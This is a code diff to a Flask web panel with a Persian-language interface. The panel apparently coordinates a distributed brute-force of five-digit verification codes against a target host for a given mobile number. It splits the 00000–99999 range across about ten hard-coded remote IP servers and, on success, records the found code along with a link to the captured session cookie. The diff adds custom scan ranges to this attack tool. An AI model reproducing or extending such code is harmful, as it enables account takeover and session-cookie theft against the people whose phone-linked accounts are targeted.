@@ -80,9 +80,8 @@ def get_worker_status():
             if status["error"] and "Code" in status["error"] and "found successfully" in status["error"]:
                 global found_success
                 found_success = True
-                # استخراج کد از پیام موفقیت
                 code = status["error"].split("Code ")[1].split(" found")[0]
-                if not any(s["code"] == code for s in success_codes):  # جلوگیری از تکرار
+                if not any(s["code"] == code for s in success_codes):
                     success_codes.append({"server": server, "code": code, "cookie_link": f"{server}/last_cookie"})
                 progress_log.append(f"Success found on {server}! Stopping all servers...")
                 socketio.emit('update_progress', {'log': progress_log[-1]})
@@ -141,6 +140,29 @@ def index():
                         <label class="block text-sm font-medium text-gray-700">تعداد کانکشن‌ها:</label>
                         <input type="number" id="connections" class="mt-1 block w-full p-3 border rounded-lg" value="20">
                     </div>
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700">نوع اسکن:</label>
+                        <div class="mt-2">
+                            <label class="inline-flex items-center">
+                                <input type="radio" name="scan_type" value="full" class="form-radio" checked>
+                                <span class="mr-2">اسکن کامل (00000-99999)</span>
+                            </label>
+                            <label class="inline-flex items-center mr-6">
+                                <input type="radio" name="scan_type" value="custom" class="form-radio">
+                                <span class="mr-2">اسکن سفارشی</span>
+                            </label>
+                        </div>
+                    </div>
+                    <div id="custom_range" class="hidden space-y-4">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-700">شروع رنج:</label>
+                            <input type="number" id="start_range" class="mt-1 block w-full p-3 border rounded-lg" placeholder="مثال: 20000">
+                        </div>
+                        <div>
+                            <label class="block text-sm font-medium text-gray-700">پایان رنج:</label>
+                            <input type="number" id="end_range" class="mt-1 block w-full p-3 border rounded-lg" placeholder="مثال: 30000">
+                        </div>
+                    </div>
                     <div class="flex space-x-6">
                         <button type="button" id="start" class="w-full bg-green-500 text-white p-3 rounded-lg hover:bg-green-600">شروع</button>
                         <button type="button" id="stop" class="w-full bg-red-500 text-white p-3 rounded-lg hover:bg-red-600" disabled>توقف</button>
@@ -189,7 +211,6 @@ def index():
             const tableBody = document.getElementById('table-body');
             const successBody = document.getElementById('success-body');
 
-            // لیست سرورها برای جدول
             const servers = [
                 "http://63.142.254.127:5000",
                 "http://63.142.246.30:5000",
@@ -203,12 +224,10 @@ def index():
                 "http://104.251.219.67:5000"
             ];
 
-            // آپدیت جدول‌ها با AJAX
             function updateTables() {
                 fetch('/get_status')
                     .then(response => response.json())
                     .then(data => {
-                        // جدول وضعیت سرورها
                         tableBody.innerHTML = '';
                         servers.forEach(server => {
                             const status = data[server] || {
@@ -230,7 +249,6 @@ def index():
                             tableBody.appendChild(row);
                         });
 
-                        // جدول موفقیت‌ها
                         fetch('/get_success')
                             .then(response => response.json())
                             .then(successData => {
@@ -253,9 +271,8 @@ def index():
                     });
             }
 
-            // هر 5 ثانیه جدول‌ها رو آپدیت کن
             setInterval(updateTables, 5000);
-            updateTables(); // اولین بار موقع لود
+            updateTables();
 
             socket.on('connect', () => {
                 console.log('Connected to WebSocket');
@@ -265,16 +282,36 @@ def index():
                 console.log('Log:', data.log);
             });
 
+            // نمایش/مخفی کردن فیلدهای رنج سفارشی
+            document.querySelectorAll('input[name="scan_type"]').forEach(radio => {
+                radio.addEventListener('change', () => {
+                    const customRangeDiv = document.getElementById('custom_range');
+                    customRangeDiv.classList.toggle('hidden', radio.value !== 'custom');
+                });
+            });
+
             startBtn.addEventListener('click', () => {
                 const host = document.getElementById('host').value;
                 const nonce = document.getElementById('nonce').value;
                 const mobile = document.getElementById('mobile').value;
                 const connections = document.getElementById('connections').value;
+                const scanType = document.querySelector('input[name="scan_type"]:checked').value;
+                let startRange = null;
+                let endRange = null;
+
+                if (scanType === 'custom') {
+                    startRange = document.getElementById('start_range').value;
+                    endRange = document.getElementById('end_range').value;
+                    if (!startRange || !endRange || startRange >= endRange) {
+                        alert('لطفاً رنج معتبر وارد کنید!');
+                        return;
+                    }
+                }
 
                 fetch('/start', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ host, nonce, mobile, connections })
+                    body: JSON.stringify({ host, nonce, mobile, connections, scan_type: scanType, start_range: startRange, end_range: endRange })
                 }).then(response => {
                     if (response.ok) {
                         startBtn.disabled = true;
@@ -306,6 +343,9 @@ def start():
     nonce = data['nonce']
     mobile = data['mobile']
     connections = int(data['connections'])
+    scan_type = data.get('scan_type', 'full')  # پیش‌فرض اسکن کامل
+    start_range = data.get('start_range')
+    end_range = data.get('end_range')
 
     found_success = False
     progress_log = []
@@ -313,10 +353,24 @@ def start():
     progress_log.append("Starting distribution to remote servers...")
     socketio.emit('update_progress', {'log': progress_log[-1]})
 
+    # تعیین رنج‌ها
+    if scan_type == 'full':
+        ranges = RANGES  # استفاده از رنج پیش‌فرض
+    else:  # scan_type == 'custom'
+        start_range = int(start_range)
+        end_range = int(end_range)
+        total_range = end_range - start_range
+        chunk_size = total_range // len(REMOTE_SERVERS)  # تقسیم رنج بین سرورها
+        ranges = []
+        for i in range(len(REMOTE_SERVERS)):
+            chunk_start = start_range + (i * chunk_size)
+            chunk_end = chunk_start + chunk_size if i < len(REMOTE_SERVERS) - 1 else end_range
+            ranges.append((chunk_start, chunk_end))
+
     threads = []
     for i, server in enumerate(REMOTE_SERVERS):
-        start_range, end_range = RANGES[i]
-        thread = threading.Thread(target=send_to_remote, args=(server, host, nonce, mobile, connections, start_range, end_range))
+        start_r, end_r = ranges[i]
+        thread = threading.Thread(target=send_to_remote, args=(server, host, nonce, mobile, connections, start_r, end_r))
         threads.append(thread)
         thread.start()
 
